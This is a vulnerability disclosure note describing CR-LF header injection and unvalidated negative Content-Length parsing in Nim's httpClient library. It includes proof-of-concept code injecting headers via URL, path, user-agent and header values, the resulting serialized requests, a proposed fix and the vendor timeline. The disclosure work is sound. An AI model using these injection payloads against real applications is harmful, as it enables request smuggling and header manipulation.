# Vulnerability Note

## Summary 

The following vulnerability note discusses two classes of vulnerabilities found in the nim-lang `httpClient` standard library:

* a `CR-LF` injection in various arguments
* lack of response value validation when parsing server responses


also see: https://consensys.net/diligence/vulnerabilities/nim-httpclient-header-crlf-injection/

## Details

### Description

The nim standard library `httpClient` is vulnerable to a `CR-LF` injection in the target url. This issue shares similarities with [CVE-2019-9740](https://nvd.nist.gov/vuln/detail/CVE-2019-9740) and [CVE-2019-9947](https://nvd.nist.gov/vuln/detail/CVE-2019-9947) reported for the Python language with the difference that more injection vectors exist. An injection is possible if the attacker controls any part of the url provided to `httpClient.[get|post|...]`, the user-agent, or custom http header names or values. 


Additionally, the library fails to properly validate the server response. For example, `httpClient.get().contentLength()` does not raise any error if a malicious server provides a negative `Content-Length`.


It should be noted that there seems to be a general lack of input validation (requests and response) and we expect more vectors to exist (e.g. see `generateHeaders`).


### Proof of Concept

Note: `nim c -r -d:ssl  client_inject.nim`

1) header injection in any url part

a) query

```nim
import httpClient
var client = newHttpClient()
var response = client.get("https://localhost:4433?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123")  
echo response.contentLength()
echo response.body()
```

Serialized request: see `X-injected`

```http
GET /?a=1 HTTP/1.1
X-injected: header
TEST: 123 HTTP/1.1
Host: localhost:4433
Connection: Keep-Alive
content-length: 0
user-agent: Nim httpclient/1.2.4

```

b) in the path

```nim
import httpClient
var client = newHttpClient()
var response = client.get("https://localhost:4433/a/1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123")
echo response.contentLength()
echo response.body()
```

Serialized request: see `X-injected`

```http
GET /a/1 HTTP/1.1
X-injected: header
TEST: 123 HTTP/1.1
Host: localhost:4433
Connection: Keep-Alive
content-length: 0
user-agent: Nim httpclient/1.2.4


```

2) header injection in user-agent, http headers

```nim
import httpClient
var client = newHttpClient("MyUserAgent\r\nX-Injected: myheader")
client.headers = newHttpHeaders({ "Content-Type": "applicat\r\nion/json" })
var response = client.get("https://localhost:4433?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123")
echo response.contentLength()
echo response.body()
```

Serialized request: see `X-injected`, `TEST: 123`

```http
GET /?a=1 HTTP/1.1
X-injected: header
TEST: 123 HTTP/1.1
Host: localhost:4433
Connection: Keep-Alive
content-length: 0
content-type: applicat
ion/json
user-agent: MyUserAgent
X-Injected: myheader


```

3) Integers are parsed as signed ints instead of natural numbers

The `httpClient` silently accepts invalid return parameters. For example, the content-length header is initially stored as a string without being verified to be in a proper range. When accessing it, it is being parsed as a signed integer and therefore allows to return negative numbers.

```nim
proc contentLength*(response: Response | AsyncResponse): int =
  ## Retrieves the specified response's content length.
  ##
  ## This is effectively the value of the "Content-Length" header.
  ##
  ## A ``ValueError`` exception will be raised if the value is not an integer.
  var contentLengthHeader = response.headers.getOrDefault("Content-Length")
  return contentLengthHeader.parseInt()
```

Request:
```http
GET /?a=1 HTTP/1.1
X-injected: header
TEST: 123 HTTP/1.1
Host: localhost:4433
Connection: Keep-Alive
content-length: 0
user-agent: Nim httpclient/1.2.4

```

Malicious server response: `Content-Length: -23`
```http
HTTP/1.1 200 OK
Date: Sun, 10 Oct 2010 23:26:07 GMT
Server: Apache/2.2.8 (Ubuntu) mod_ssl/2.2.8 OpenSSL/0.9.8g
Last-Modified: Sun, 26 Sep 2010 22:04:35 GMT
ETag: "45b6-834-49130cc1182c0"
Accept-Ranges: bytes
Content-Length: -23
Connection: close
Content-Type: text/html

Hello world!

```

Accessing the `Content-Length` yields the negative number -23.

```nim
import httpClient
var client = newHttpClient()
var response = client.get("http://localhost:4433/a/1 HTTP/1.1\r\nX-i\x00\x01YOnjected: header\r\nTEST: 123")
echo response.contentLength()
echo response.body()
```

output:

```
⇒  nim c -r -d:ssl  client_inject.nim
...

-23
```

This might pose a risk to applications that are not checking whether response values are within sane bounds.




### Proposed Fix

- properly validate all parameters used in the module. Do not allow any context sensitive characters of the underlying protocol (e.g. `CR-LF`, `:` in header keys, ...)
- validate the server response. Use `parseNatural` instead of `parseInt` to parse positive natural numbers.

## Vendor Response

Vendor response: fixed in [v1.2.6](https://nim-lang.org/blog/2020/07/30/versions-126-and-108-released.html)

### Timeline

```
JUL/09/2020 - contact nim developers @telegram; provided details, PoC
JUL/30/2020 - fixed in new release
